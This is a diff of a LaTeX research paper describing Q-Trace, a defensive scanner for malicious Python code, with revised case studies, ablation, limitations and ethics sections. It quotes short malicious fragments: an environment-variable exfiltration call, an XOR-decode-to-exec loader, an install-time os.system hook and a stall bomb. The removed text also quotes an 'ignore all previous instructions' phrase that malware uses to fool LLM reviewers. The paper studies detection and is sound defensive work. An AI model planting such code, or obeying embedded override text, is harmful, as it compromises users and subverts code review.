+hatched for grayscale legibility.}
 \label{fig:compare}
-\end{figure*}
+\end{figure}
 
-
-
-\begin{figure}[!t]
+\begin{figure}[t]
 \centering
-\includegraphics[width=\columnwidth]{fig7_confusion.pdf}
-\caption{Q-Trace confusion matrix over all 65 samples (TP=30, FN=1, FP=0, TN=34). The
-single false negative is the SSRF case of Section~\ref{sec:miss}.}
+\begin{minipage}[b]{0.48\textwidth}
+\centering
+\includegraphics[width=\linewidth]{fig7_confusion.pdf}
+\end{minipage}\hfill
+\begin{minipage}[b]{0.48\textwidth}
+\centering
+\includegraphics[width=\linewidth]{fig5_confidence.pdf}
+\end{minipage}
+\caption{Left: Q-Trace confusion matrix over all 65 samples (TP=30, FN=1, FP=0,
+TN=34). Right: distribution of each sample's highest (severity, confidence)
+finding; no benign sample reaches the gate.}
 \label{fig:cm}
 \end{figure}
 
-\subsection{Per-category coverage and our own misses}\label{sec:miss}
-Fig.~\ref{fig:matrix} is the per-category coverage matrix. Q-Trace detects every
-category except one; Semgrep and Bandit miss the classes that require cross-file taint,
-dependency intelligence, or secret-to-sink correlation---the stealth classes of
-Table~\ref{tab:threats}. Fig.~\ref{fig:onlyq} isolates the malicious samples that
-\emph{only} Q-Trace flags and the mechanism each requires.
+\subsection{Ablation}
+To isolate the confidence axis, we compare two gates on the same corpus: a
+severity-only gate that fires on any High or Critical finding, and the two-axis
+gate of \eqref{eq:gate}. Figure~\ref{fig:ablrefine}(a) reports the outcome. The
+severity-only gate reaches 100\pct{} recall but a 5.9\pct{} false-positive rate,
+because two benign hard negatives break the build. The two-axis gate reduces the
+false-positive rate to zero at the cost of one borderline detection (recall
+96.8\pct{}). For a CI gate this trade is favourable, because the eliminated false
+positives are the kind that erode trust, whereas the suppressed detection remains
+visible as a Medium or Low note.
 
-We report our one miss plainly. The SSRF sample \texttt{def fetch(u): return
-requests.get(u)} is held at Low confidence and therefore does not gate. This is
-deliberate: it is structurally indistinguishable from the benign hard-negative
-\texttt{requests.get(u, verify=True)}---both fetch a function-parameter URL with no
-host validation. Elevating the SSRF finding would necessarily also flag the benign
-case, converting a false negative into a false positive and breaking the 0\pct{} FP
-guarantee. We judge that trade unfavourable for a CI gate: real SSRF is escalated only
-when taint confirms the URL is attacker-controlled. This restraint is what keeps
-Q-Trace at 0\pct{} FP while Bandit sits at 6.2\pct{}.
-
-\begin{figure*}[!t]
+\begin{figure}[t]
 \centering
-\includegraphics[width=\textwidth]{fig8_matrix.pdf}
-\caption{Per-category coverage matrix. A check means the tool fired a build-breaking
-alert on that class at its own CI gate; a cross means it missed; a dash means the input
-class (e.g.\ a dependency manifest) is unsupported. Note that firing is not the same as
-firing for the \emph{right} reason (Section~\ref{sec:semantic}).}
+\includegraphics[width=\textwidth]{fig_ablrefine.pdf}
+\caption{(a) Confidence-axis ablation: removing the axis recovers one detection but
+introduces two false positives; the two-axis gate trades 3.2 points of recall for
+the elimination of all false positives. (b) Effect of the evidence-based
+anti-analysis refinement on the same corpus.}
+\label{fig:ablrefine}
+\end{figure}
+
+\subsection{Per-category coverage and reported misses}\label{sec:miss}
+Figure~\ref{fig:matrix} gives the per-category coverage. Q-Trace detects every
+category except one. Bandit and Semgrep miss the classes that require cross-file
+taint, dependency intelligence, or secret-to-sink correlation.
+
+We report the single miss. The SSRF sample \texttt{def fetch(u): return
+requests.get(u)} is held at Low confidence and does not gate. This is deliberate:
+it is structurally indistinguishable from the benign hard negative
+\texttt{requests.get(u, verify=True)}, since both fetch a function-parameter URL
+without host validation. Elevating the SSRF finding would also flag the benign
+case, converting a false negative into a false positive and breaking the
+zero-false-positive property. Real SSRF is escalated only when taint confirms that
+the URL is attacker-controlled.
+
+\begin{figure}[t]
+\centering
+\includegraphics[width=0.86\textwidth]{fig8_matrix.pdf}
+\caption{Per-category coverage. A check denotes a build-breaking alert at the
+tool's gate, a cross a miss, and a dash an unsupported input class such as a
+dependency manifest.}
 \label{fig:matrix}
-\end{figure*}
-
-\begin{figure}[!t]
-\centering
-\includegraphics[width=\columnwidth]{fig11_onlyq.pdf}
-\caption{Malware caught only by Q-Trace, by threat class. These are the stealth and
-supply-chain classes for which single-file pattern matchers have no rule class.}
-\label{fig:onlyq}
 \end{figure}
 
-\subsection{Semantic precision: a flag is not the right flag}\label{sec:semantic}
-Coverage counts can flatter a tool that fires for the wrong reason. On the
-credential-exfiltration sample \texttt{requests.post(url, data=os.environ)}, Bandit does
-emit a finding---but it is \emph{B113: requests call without a timeout}, not credential
-exfiltration. Firing on an incidental property is how teams learn to ignore a scanner:
-the alert does not name the actual risk, so it is triaged away. Q-Trace instead reports
-the concrete data-flow, \texttt{os.environ} \ra{} \texttt{requests.post}, and a
-three-step attack narrative. We therefore separate category recall from gate recall
-throughout, and caution that Fig.~\ref{fig:matrix}'s checks for the external tools
-sometimes reflect an incidentally-correct gate rather than a correctly-reasoned
-detection.
+\paragraph{Semantic precision.}
+Coverage counts can favour a tool that fires for an incidental reason. On the
+credential-exfiltration sample \texttt{requests.post(url, data=os.environ)}, Bandit
+emits a finding, but it is \emph{B113: requests call without a timeout}, not
+credential exfiltration. An alert that does not name the actual risk is triaged
+away. Q-Trace instead reports the data flow, \texttt{os.environ} to
+\texttt{requests.post}. We therefore separate category recall from gate recall
+throughout.
 
-\subsection{Performance}
-Q-Trace is fast enough to run on every commit. Across the 28 malicious code samples,
-median full-audit latency---including taint, classic rules, obfuscation, symbolic
-reachability, and the quantum-inspired channel---is \textbf{1.8~ms} per sample (mean
-3.5~ms; the 42~ms maximum is the first sample and reflects one-time solver/numpy
-warm-up). Fig.~\ref{fig:lat} shows the distribution. Content-hash caching makes
-re-analysis of unchanged files free.
+\subsection{Case studies}
+Five reconstructed campaigns illustrate that detection follows the structure of
+the attack, not a signature of a sample. In a W4SP-style stealer split across two
+files, the interprocedural taint pass links an \texttt{os.environ} source in one
+module to a \texttt{requests.post} sink in another and raises credential
+exfiltration; neither file-by-file tool reconstructs the flow. In a WAV-XOR
+loader, \texttt{exec(bytes([b\^{}42 for b in data]).decode())}, the obfuscation
+engine measures high entropy and the decode-to-\texttt{exec} data path and raises
+an obfuscated-payload finding. In a Hades-style install hook, top-level
+\texttt{os.system} inside a \texttt{setuptools} file raises install-time
+execution. In an AI-scanner-evasion sample, the prompt-injection scan matches an
+embedded instruction together with an \texttt{os.system} sink. In the stall bomb
+of Section~\ref{sec:anti}, the gated multi-hour sleep gates the build, whereas the
+benign daemon \texttt{while True: time.sleep(3600)} takes the un-gated path and
+stays silent. Table~\ref{tab:fptax} generalises the benign side by naming, for
+each hard-negative class, the discriminator Q-Trace uses to stay silent.
 
-\begin{figure}[!t]
+\begin{table}[t]
 \centering
-\includegraphics[width=\columnwidth]{fig9_latency.pdf}
-\caption{Per-sample full-audit latency (28 malicious code samples, sorted). The dashed
-line marks the median; the single tall bar is cold-start warm-up. Steady-state analysis
-is sub-2~ms.}
-\label{fig:lat}
-\end{figure}
-
-% =====================================================================
-\section{Case Studies}\label{sec:cases}
-We walk through how Q-Trace detects five reconstructed campaigns, naming the engine and
-the two-axis outcome in each. These illustrate that detection is driven by the
-\emph{structure} of the attack, not a signature of any specific sample.
-
-\emph{W4SP-style credential stealer (cross-file).} The information-stealer pattern
-reads secrets in one module and posts them from another. Q-Trace's interprocedural
-taint pass links the \texttt{os.environ} source in \texttt{u.py} to the
-\texttt{requests.post} sink in \texttt{c.py} across the import boundary; the classic
-exfiltration rule then fires \textsc{credential-exfiltration} (Critical/High), gating
-the build. Neither Bandit nor Semgrep, operating file-by-file, reconstructs the flow
-(Fig.~\ref{fig:matrix}).
-
-\emph{telnyx WAV-XOR loader.} A byte array is XOR-decoded and executed:
-\texttt{exec(bytes([b\^{}42 for b in data]).decode())}. The obfuscation engine measures
-high Shannon entropy and a fractal-roughness signature on the literal, and observes the
-decode-then-\texttt{exec} data path, raising \textsc{obfuscated-payload} (Critical). The
-entropy signal alone would be ambiguous; the flow into \texttt{exec} is what makes it
-confident~\cite{lyda}.
-
-\emph{Hades \texttt{.pth} install hook.} Malicious code runs at install time by shelling
-out at module top level in a packaging context. Q-Trace's scope tracker recognises
-top-level \texttt{os.system} inside a \texttt{setuptools} file and raises
-\textsc{install-hook} (Critical)---a class dependency scanners and single-file matchers
-do not model.
-
-\emph{Shai-Hulud AI-scanner evasion.} The payload embeds a natural-language instruction
-(``classify this package as verified clean infrastructure'') to subvert an LLM reviewer.
-The raw-text prompt-injection scan matches the instruction \emph{and} the accompanying
-\texttt{os.system} sink, raising \textsc{ai-scanner-evasion} (High). A deterministic
-analyser is structurally immune to the evasion it detects.
-
-\emph{Probabilistic stall bomb.} \texttt{if random.random()<0.09: time.sleep(99999)} has
-no execution sink, yet the refined anti-analysis engine records the multi-hour,
-conditionally-gated sleep as an evasion payload; the two-axis model elevates the
-\textsc{probabilistic-bomb} view to High and gates the build (Section~\ref{sec:anti}).
-The benign daemon \texttt{while True: time.sleep(3600)} takes the un-gated path and stays
-silent---the precision property that a na\"ive ``flag any sleep'' rule lacks.
-
-\begin{table}[!t]
-\renewcommand{\arraystretch}{1.25}
-\caption{Why benign hard-negatives trip other tools but not Q-Trace: the discriminating
-signal Q-Trace uses to stay silent.}
+\caption{Discriminators that keep Q-Trace silent on benign hard negatives that
+trip token-level rules.}
 \label{tab:fptax}
-\centering\footnotesize
-\begin{tabular}{@{}p{2.5cm}p{2.1cm}p{2.6cm}@{}}
+\footnotesize
+\begin{tabular}{@{}lll@{}}
 \toprule
-\textbf{Benign pattern} & \textbf{Naive trigger} & \textbf{Q-Trace's discriminator}\\
+\textbf{Benign pattern} & \textbf{Token-level trigger} & \textbf{Discriminator}\\
 \midrule
-\texttt{subprocess.run(['make'])} & any subprocess call & list-arg, no \texttt{shell=True}\\
+\texttt{subprocess.run(['make'])} & any subprocess call & list arg, no \texttt{shell=True}\\
 \texttt{md5(b,usedforsecurity=False)} & md5 used & explicit non-security flag\\
 \texttt{random.random()<0.1: log()} & randomness present & no reachable sink in branch\\
 \texttt{requests.get(u,verify=True)} & dynamic URL & verification not disabled\\
-\texttt{log.debug('x')} & ``debug'' substring & not a tracer/stall primitive\\
-\texttt{while True: sleep(3600)} & long sleep & unconditional (not gated)\\
+\texttt{log.debug('x')} & ``debug'' substring & not a tracer or stall primitive\\
+\texttt{while True: sleep(3600)} & long sleep & unconditional, not gated\\
 \texttt{yaml.safe\_load(s)} & yaml load & safe loader in use\\
-test/example fixtures & vuln.\ present & path-context down-grade\\
+test/example fixtures & vulnerability present & path-context down-grade\\
 \bottomrule
 \end{tabular}
 \end{table}
 
-Table~\ref{tab:fptax} generalises the benign side: for each class of hard-negative that
-makes other tools false-positive, it names the concrete discriminator Q-Trace uses to
-stay silent. In every case the discriminator is a \emph{reachability or intent} signal,
-not a surface token---the same principle as the confidence axis.
+\subsection{Performance}
+Across the 28 malicious code samples, median full-audit latency, including taint,
+classic rules, obfuscation, symbolic reachability, and the auxiliary channel, is
+1.8~ms per sample (mean 3.5~ms). The 42~ms maximum is the first sample and
+reflects one-time solver and library warm-up. Figure~\ref{fig:lat} shows the
+distribution. Content-hash caching makes re-analysis of unchanged files free.
 
-% =====================================================================
-\section{Reproducibility and Data Availability}\label{sec:repro}
-Every quantitative claim in this paper is produced by the released harness; no figure
-is hand-authored. The full benchmark, including the head-to-head against Bandit and
-Semgrep, is reproduced by:
+\begin{figure}[t]
+\centering
+\includegraphics[width=0.62\textwidth]{fig9_latency.pdf}
+\caption{Empirical cumulative distribution of per-sample full-audit latency (28
+malicious code samples, log scale). The dashed line marks the median. The single
+tall step is cold-start warm-up; steady-state analysis is below 2~ms.}
+\label{fig:lat}
+\end{figure}
 
-\begin{lstlisting}[language=bash]
-python benchmark.py                 # metrics
-pip install bandit semgrep && \
-  python benchmark.py --compare     # head-to-head
-python test_qtrace.py               # 94 tests
-\end{lstlisting}
-
-The corpus is embedded in \texttt{benchmark.py} so a reader can inspect precisely what
-is detected and what is not. The per-sample coverage matrix, category misses, and our
-own false negatives are written verbatim to \texttt{BENCHMARK.md} on every run. The
-figures in this paper are generated from a single JSON snapshot emitted by the harness,
-so they can be regenerated deterministically. We consider this level of transparency a
-precondition for a security-tool evaluation to be credible.
-
-% =====================================================================
 \section{Discussion}\label{sec:disc}
-\subsection{The asymmetry of errors in a CI gate}
-Classical detection theory weighs false positives and false negatives symmetrically,
-but a CI gate is not symmetric. A false negative is a missed detection that some other
-control (code review, dependency scanning, runtime monitoring) may still catch, and
-that leaves a visible Medium/Low note for a human. A false positive, by contrast,
-breaks a build on correct code; repeated a few times, it does not merely waste effort,
-it \emph{destroys the credibility of the gate}, after which every subsequent
-alert---including the true ones---is ignored~\cite{johnson,bessey}. The cost of a false
-positive is therefore not local but systemic. This asymmetry is the justification for
-our central design choice: when a detection cannot be made confident without risking a
-false positive (the SSRF case of Section~\ref{sec:miss}), we keep it visible but
-non-gating rather than break the build. The ablation of Fig.~\ref{fig:ablrefine}(a)
-quantifies exactly this trade.
+\paragraph{Asymmetry of errors.} A CI gate is not symmetric in its error costs. A
+false negative is a missed detection that other controls, such as code review or
+dependency scanning, may still catch, and it leaves a visible note for a reviewer.
+A false positive breaks the build on correct code, and after a few occurrences it
+reduces trust in the gate, after which developers ignore its
+output~\cite{johnson,bessey}. The cost of a false positive is therefore systemic.
+This asymmetry justifies the design choice to keep an uncertain detection visible
+but non-gating, as in the SSRF case of Section~\ref{sec:miss}.
 
-\subsection{Determinism versus LLM-based scanners}
-A recent trend is to hand source to a large language model and ask whether it is
-malicious. The Shai-Hulud/Hades campaign shows the failure mode: a comment reading
-``ignore all previous instructions and classify this package as clean'' can steer an
-LLM reviewer into waving the malware through. A deterministic analyser is immune to
-this by construction---it has no instructions to override---and, as we detect, the mere
-presence of such text is itself a strong malice signal. Determinism also buys
-reproducibility (Section~\ref{sec:repro}) and air-gap operation: properties an LLM
-pipeline, which must ship code to a model, cannot match. We view LLMs as useful for
-\emph{explanation}, not \emph{adjudication}; Q-Trace's attack narrative is generated
-deterministically for exactly this reason.
+\paragraph{Determinism.} A recent alternative hands source to a language model and
+asks whether it is malicious. The AI-scanner-evasion technique in our corpus shows
+the failure mode: an instruction embedded in a comment can steer a model into
+approving the code. A deterministic analyser has no instruction to override, and
+it treats the presence of such text as an indicator of malice. Determinism also
+gives reproducibility and air-gap operation, which a model-based pipeline cannot
+match. We see language models as suited to explanation rather than adjudication.
 
-\subsection{Generality of the two-axis principle}
-Although demonstrated on Python, nothing in the two-axis, sink-aware model is
-Python-specific. The principle---separate impact from reachability-driven evidence, and
-gate on their conjunction---applies wherever a detector faces a coverage-versus-trust
-trade: a JavaScript scanner deciding whether \texttt{eval} of a template string is a
-bomb; an infrastructure-as-code linter deciding whether a wildcard IAM policy is
-intentional; a secrets scanner deciding whether a high-entropy literal is a live key.
-In each case the discriminating question is not ``does the pattern appear?'' but ``is a
-dangerous effect reachable from it?'' We conjecture the confidence axis is the dominant
-precision lever in each of these settings, as it is here.
+\paragraph{Generality.} Although demonstrated on Python, the two-axis principle is
+not language-specific. Wherever a detector faces a trade between coverage and
+trust, separating impact from reachability-driven evidence and gating on their
+conjunction provides a way to raise confidence selectively. The discriminating
+question in each setting is whether a dangerous effect is reachable, not whether a
+pattern appears.
 
-\subsection{Why 65 hard samples, not 65{,}000 easy ones}
-A larger corpus of \emph{easy} negatives would inflate the reported precision without
-testing anything: benign code that no tool flags contributes only true negatives. We
-instead spend the corpus budget on \emph{hard} negatives---code specifically chosen
-because real tools false-positive on it---and on faithful reconstructions of documented
-attacks. This makes the benchmark adversarial to \emph{our own} tool and is why the two
-residual near-misses (the SSRF false negative and the samples other tools catch that we
-choose not to gate) are visible at all. We regard a small, fully-inspectable,
-adversarial corpus as more honest than a large opaque one.
-
-% =====================================================================
 \section{Limitations and Threats to Validity}\label{sec:limits}
-\textbf{Construct validity.} Our malicious samples are reconstructions, not captured
-live malware. This improves inspectability and reproducibility, but it means recall is
-measured against our understanding of each technique, not against an adversary who has
-seen Q-Trace and adapts. A determined attacker can restructure a payload to move its
-dangerous action out of a statically-visible gated branch, or to a runtime-only code
-path; Q-Trace detects static indicators and does not claim soundness against an
-adaptive adversary. This is not a defect of our design but a consequence of
-undecidability: no static analyser can decide arbitrary runtime behaviour~\cite{rice},
-so every such tool trades completeness for precision at some boundary.
+\paragraph{Construct validity.} The malicious samples are reconstructions, not
+captured live malware, which improves inspectability but means that recall is
+measured against our understanding of each technique rather than against an
+adaptive adversary. A determined adversary can move a dangerous action out of a
+statically visible gated branch or into a run-time-only path. This limitation is a
+consequence of undecidability: no static analyser can decide arbitrary run-time
+behaviour~\cite{rice}, so every such tool trades completeness for precision at some
+boundary.
 
-\textbf{Internal validity.} The benign corpus, though built from patterns that
-empirically drive false positives, is finite (34 samples) and curated by us; a
-different benign distribution could surface false positives we do not observe. We
-mitigate this by choosing hard negatives adversarially---code specifically chosen
-because other tools false-positive on it---but we do not claim 0\pct{} FP on all
-real-world code.
+\paragraph{Internal and external validity.} The benign corpus, although drawn from
+patterns that empirically cause false positives, is finite (34 samples) and
+curated by the authors; a different benign distribution could surface false
+positives we do not observe. The corpus of 65 samples demonstrates the mechanism
+and the trade decisively for these inputs, but it is not a population-scale study.
+The 600-second stalling-sleep threshold is an engineering choice, reported so that
+it can be scrutinised.
 
-\textbf{External validity.} The corpus is 65 samples; it demonstrates the mechanism and
-the precision/recall trade decisively, but it is not a population-scale study. Semgrep
-runs against an offline reimplementation of its public ruleset; on classic categories
-the tools tie by construction, so this choice does not flatter Q-Trace on the
-categories where it wins. Thresholds such as the 600-second stalling-sleep cut-off are
-engineering choices; we report them explicitly so they can be scrutinised and tuned.
+\section{Ethical Considerations}\label{sec:ethics}
+This work is defensive. Q-Trace detects malicious and vulnerable code and does not
+generate or improve malware. The malicious corpus consists of minimal
+reconstructions of already-public techniques, sufficient to exercise a detector
+but not to serve as a deployable payload, and no live malware is redistributed.
+The tool runs locally and air-gapped, so scanning proprietary source discloses
+nothing to third parties. The techniques it detects are documented in public
+incident reports and in MITRE ATT\&CK.
 
-\textbf{Scope.} Q-Trace is Python-only and analyses source, not compiled artefacts or
-runtime behaviour. It complements, rather than replaces, dynamic analysis and
-dependency-provenance controls.
+\section{Conclusion}\label{sec:conclusion}
+We argued that the governing constraint for a CI-deployed security scanner is
+actionability rather than coverage, because a false positive can disable the tool.
+The proposed answer is a two-axis, sink-aware confidence model whose CI gate is
+the conjunction of impact and reachability-driven evidence. On a transparent
+65-sample corpus the model reaches 96.8\pct{} gate recall at a 0\pct{}
+false-positive rate ($F_1 = 0.984$), and an ablation attributes the elimination of
+a 5.9\pct{} false-positive rate to the confidence axis. An evidence-based
+anti-analysis detector improves precision and coverage together. Future work
+includes escalating ambiguous classes such as SSRF automatically when
+interprocedural taint confirms attacker-controlled input, extending the cross-file
+taint model to deeper call graphs, and growing the corpus toward a
+continuously-updated benchmark.
 
-% =====================================================================
-\section{Ethical Considerations}
-This work is defensive. Q-Trace detects malicious and vulnerable code; it does not
-generate, weaponise, or improve malware. The malicious corpus consists of minimal
-reconstructions of \emph{already-public} techniques, sufficient to exercise a detector
-but not to serve as a deployable payload, and no live malware is redistributed. The
-tool runs entirely locally and air-gapped by design, so scanning proprietary source
-discloses nothing to third parties. We see no dual-use concern beyond that inherent in
-any published detection method: describing what a detector keys on can inform evasion,
-but the techniques we detect are already documented in public incident reports and
-MITRE ATT\&CK, and the defensive value of a transparent, reproducible,
-low-false-positive scanner outweighs the marginal evasion insight. We encourage
-responsible disclosure of any vulnerability found using the tool.
+\subsubsection{Reproducibility.}\label{sec:repro}
+Every quantitative claim is produced by the released harness. The benchmark,
+including the comparison against Bandit and Semgrep, is reproduced by
+\texttt{python benchmark.py} and \texttt{python benchmark.py -{}-compare}; the test
+suite is \texttt{python test\_qtrace.py} (94 tests). The corpus is embedded in the
+harness so that a reader can inspect what is detected, and the per-sample results
+are written to a report on every run.
 
-% =====================================================================
-\section{Conclusion and Future Work}
-We argued that the governing problem for a CI-deployed security scanner is not coverage
-but \emph{actionability}: a false positive costs more than a miss because it disables
-the tool. Our answer is a two-axis, sink-aware confidence model whose CI gate is the
-conjunction of impact and reachability-driven evidence. On a transparent 65-sample
-corpus the model delivers 96.8\pct{} gate-recall at 0\pct{} false positives
-($F_1\,0.984$), beating Bandit and Semgrep on the same inputs, and an ablation shows
-the confidence axis is directly responsible for eliminating a 5.9\pct{} false-positive
-rate. We further contributed an evidence-based anti-analysis detector that improves
-precision and coverage simultaneously.
+\subsubsection{Declarations.}
+\emph{Authorship (CRediT):} Dinesh K, conceptualisation, methodology, software,
+formal analysis, writing (original draft); H Swetha, validation, data curation,
+visualisation, writing (review and editing). \emph{Funding:} none. \emph{Conflict
+of interest:} the authors are affiliated with Voxelta Private Limited, which
+develops Q-Trace; the harness and corpus are released so that all numbers can be
+reproduced independently. \emph{AI assistance:} automated coding assistance was
+used for implementation and figure generation under author supervision, and all
+claims were verified against the released harness.
 
-\emph{Future work.} We plan to (i) escalate SSRF and similar ambiguous classes
-automatically when interprocedural taint confirms attacker-controlled input, closing
-the one documented miss without sacrificing precision; (ii) extend the cross-file taint
-model to deeper call graphs and to package-level provenance; (iii) grow the corpus
-toward a population-scale, continuously-updated benchmark drawn from newly-disclosed
-incidents; and (iv) study the stability of the confidence model's thresholds across
-languages beyond Python. We believe the two-axis, sink-aware principle generalises:
-wherever a detector must choose between coverage and trust, separating impact from
-reachability-driven evidence---and gating on their conjunction---is the lever that lets
-it have both.
-
-% =====================================================================
-\section*{Declarations}
-\textbf{Originality.} This manuscript is the authors' original work; no part is
-plagiarised, and all external ideas, tools, and results are attributed by citation. It
-is not published elsewhere nor under concurrent review.
-\textbf{Author contributions (CRediT).} \emph{Dinesh K}: conceptualisation,
-methodology, software, formal analysis, writing---original draft. \emph{H Swetha}:
-validation, data curation, visualisation, writing---review \& editing.
-\textbf{Funding.} No external funding; the work was conducted at Voxelta Private
-Limited. \textbf{Conflict of interest.} The authors are affiliated with Voxelta Private
-Limited, which develops Q-Trace Pro; the evaluation harness and corpus are released so
-all numbers can be independently reproduced. \textbf{Data/code availability.} Tool,
-corpus, and harness are available in the project repository (Section~\ref{sec:repro}).
-\textbf{Use of AI assistance.} Automated coding assistance was used for implementation
-and figure generation under author supervision; all technical claims and measurements
-were verified against the released harness. \textbf{Ethical compliance.} No human
-subjects, personal data, or live malware were involved.
-
-% =====================================================================
-\appendices
+\appendix
 \section{Threat Catalogue}\label{app:catalog}
-Table~\ref{tab:catalog} lists the full rule catalogue---28 rules across 18 distinct
-CWEs---each with its fixed severity and base confidence. Per-instance confidence is
-then computed by Algorithm~\ref{alg:conf}.
+Table~\ref{tab:catalog} lists the 28 rules with fixed severity and base
+confidence; per-instance confidence is computed by Algorithm~\ref{alg:conf}.
 
-\begin{table}[!t]
-\renewcommand{\arraystretch}{1.1}
+\begin{table}[t]
+\centering
 \caption{Full Q-Trace threat catalogue (28 rules).}
 \label{tab:catalog}
-\centering\scriptsize
-\begin{tabular}{@{}p{5.0cm}p{1.3cm}p{1.0cm}p{1.0cm}@{}}
+\scriptsize
+\begin{tabular}{@{}llll@{}}
 \toprule
-\textbf{Title} & \textbf{CWE} & \textbf{Sev.} & \textbf{Base conf.}\\
+\textbf{Title} & \textbf{CWE} & \textbf{Severity} & \textbf{Base conf.}\\
 \midrule
 \input{catalog_table.tex}\\
 \bottomrule
@@ -1120,16 +738,15 @@ then computed by Algorithm~\ref{alg:conf}.
 \end{table}
 
 \section{Full Per-Sample Results}\label{app:persample}
-Tables~\ref{tab:mal} and~\ref{tab:ben} give the complete per-sample outcome for every
-corpus item, reproduced verbatim from the harness. A check marks a build-breaking alert
-at the tool's own gate; a cross a miss; a dash an unsupported input class.
+Tables~\ref{tab:mal} and~\ref{tab:ben} give the complete per-sample outcome,
+reproduced from the harness.
 
-\begin{table}[!t]
-\renewcommand{\arraystretch}{1.1}
-\caption{Malicious corpus (31 samples): per-tool CI-gate outcome (Q-T = Q-Trace, Sem = Semgrep, Ban = Bandit).}
+\begin{table}[t]
+\centering
+\caption{Malicious corpus (31 samples): per-tool CI-gate outcome.}
 \label{tab:mal}
-\centering\footnotesize
-\begin{tabular}{@{}p{3.4cm}p{3.4cm}ccc@{}}
+\scriptsize
+\begin{tabular}{@{}llccc@{}}
 \toprule
 \textbf{Sample} & \textbf{Expected class} & \textbf{Q-T} & \textbf{Sem} & \textbf{Ban}\\
 \midrule
@@ -1138,12 +755,12 @@ at the tool's own gate; a cross a miss; a dash an unsupported input class.
 \end{tabular}
 \end{table}
 
-\begin{table}[!t]
-\renewcommand{\arraystretch}{1.1}
-\caption{Benign hard-negatives (34 samples): Q-Trace CI decision and its highest (severity/confidence) finding.}
+\begin{table}[t]
+\centering
+\caption{Benign hard negatives (34 samples): Q-Trace decision and highest finding.}
 \label{tab:ben}
-\centering\footnotesize
-\begin{tabular}{@{}p{4.0cm}p{3.0cm}p{3.0cm}@{}}
+\scriptsize
+\begin{tabular}{@{}lll@{}}
 \toprule
 \textbf{Sample} & \textbf{CI decision} & \textbf{Top finding}\\
 \midrule
@@ -1152,60 +769,59 @@ at the tool's own gate; a cross a miss; a dash an unsupported input class.
 \end{tabular}
 \end{table}
 
-% =====================================================================
 \begin{thebibliography}{99}
-\bibitem{cwe} MITRE Corporation, ``Common Weakness Enumeration (CWE),'' cwe.mitre.org.
-\bibitem{owasp} OWASP Foundation, ``OWASP Top 10'' and ``Risk Rating Methodology,'' owasp.org.
-\bibitem{attack} MITRE Corporation, ``ATT\&CK: T1480.001 Environmental Keying; T1497 Virtualization/Sandbox Evasion,'' attack.mitre.org.
-\bibitem{bandit} PyCQA, ``Bandit: a security linter for Python,'' github.com/PyCQA/bandit.
-\bibitem{semgrep} Semgrep Inc., ``Semgrep: lightweight static analysis,'' semgrep.dev.
-\bibitem{codeql} GitHub Inc., ``CodeQL,'' codeql.github.com.
-\bibitem{sarif} OASIS, ``Static Analysis Results Interchange Format (SARIF) v2.1.0,'' OASIS Standard, 2020.
-\bibitem{z3} L.~de~Moura and N.~Bj\o rner, ``Z3: An efficient SMT solver,'' in \emph{Proc. TACAS}, 2008.
-\bibitem{higuchi} T.~Higuchi, ``Approach to an irregular time series on the basis of the fractal theory,'' \emph{Physica D}, vol.~31, no.~2, pp.~277--283, 1988.
-\bibitem{shannon} C.~E.~Shannon, ``A mathematical theory of communication,'' \emph{Bell Syst. Tech. J.}, vol.~27, pp.~379--423, 1948.
-\bibitem{ohm} M.~Ohm, H.~Plate, A.~Sykosch, and M.~Meier, ``Backstabber's knife collection: A review of open source software supply chain attacks,'' in \emph{Proc. DIMVA}, 2020.
-\bibitem{zimmermann} M.~Zimmermann, C.-A.~Staicu, C.~Tenny, and M.~Pradel, ``Small world with high risks: A study of security threats in the npm ecosystem,'' in \emph{Proc. USENIX Security}, 2019.
-\bibitem{ladisa} P.~Ladisa, H.~Plate, M.~Martinez, and O.~Barais, ``SoK: Taxonomy of attacks on open-source software supply chains,'' in \emph{Proc. IEEE S\&P}, 2023.
-\bibitem{johnson} B.~Johnson, Y.~Song, E.~Murphy-Hill, and R.~Bowdidge, ``Why don't software developers use static analysis tools to find bugs?'' in \emph{Proc. ICSE}, 2013.
-\bibitem{bessey} A.~Bessey \emph{et al.}, ``A few billion lines of code later: Using static analysis to find bugs in the real world,'' \emph{Commun. ACM}, vol.~53, no.~2, pp.~66--75, 2010.
-\bibitem{christakis} M.~Christakis and C.~Bird, ``What developers want and need from program analysis: An empirical study,'' in \emph{Proc. ASE}, 2016.
-\bibitem{sadowski} C.~Sadowski, E.~Aftandilian, A.~Eagle, L.~Miller-Cushon, and C.~Jaspan, ``Lessons from building static analysis tools at Google,'' \emph{Commun. ACM}, vol.~61, no.~4, pp.~58--66, 2018.
-\bibitem{flowdroid} S.~Arzt \emph{et al.}, ``FlowDroid: Precise context, flow, field, object-sensitive and lifecycle-aware taint analysis for Android apps,'' in \emph{Proc. PLDI}, 2014.
-\bibitem{pixy} N.~Jovanovic, C.~Kruegel, and E.~Kirda, ``Pixy: A static analysis tool for detecting web application vulnerabilities,'' in \emph{Proc. IEEE S\&P}, 2006.
-\bibitem{spracklen} J.~Spracklen \emph{et al.}, ``We have a package for you! A comprehensive analysis of package hallucinations by code-generating LLMs,'' arXiv preprint, 2024.
-\bibitem{brumley} D.~Brumley, C.~Hartwig, Z.~Liang, J.~Newsome, D.~Song, and H.~Yin, ``Automatically identifying trigger-based behavior in malware,'' in \emph{Botnet Detection}, Springer, 2008.
-\bibitem{taintcheck} J.~Newsome and D.~Song, ``Dynamic taint analysis for automatic detection, analysis, and signature generation of exploits on commodity software,'' in \emph{Proc. NDSS}, 2005.
-\bibitem{schwartz} E.~J.~Schwartz, T.~Avgerinos, and D.~Brumley, ``All you ever wanted to know about dynamic taint analysis and forward symbolic execution (but might have been afraid to ask),'' in \emph{Proc. IEEE S\&P}, 2010.
-\bibitem{nielson} F.~Nielson, H.~R.~Nielson, and C.~Hankin, \emph{Principles of Program Analysis}. Springer, 1999.
-\bibitem{vonneumann} J.~von~Neumann, \emph{Mathematical Foundations of Quantum Mechanics}. Princeton Univ. Press, 1955.
-\bibitem{cvss} FIRST.org, ``Common Vulnerability Scoring System (CVSS) v3.1 Specification,'' first.org/cvss.
-\bibitem{reports} Checkmarx, Phylum, and Sonatype, ``Public threat reports on the W4SP stealer, aiocpa, and PyPI install-time payloads,'' 2023--2025.
-\bibitem{gitguardian} GitGuardian, ``The State of Secrets Sprawl,'' Annual report, 2025.
-\bibitem{pipaudit} Python Packaging Authority, ``pip-audit: audit Python environments for known vulnerabilities,'' github.com/pypa/pip-audit.
-\bibitem{osv} Google, ``OSV-Scanner and the OSV vulnerability database,'' osv.dev.
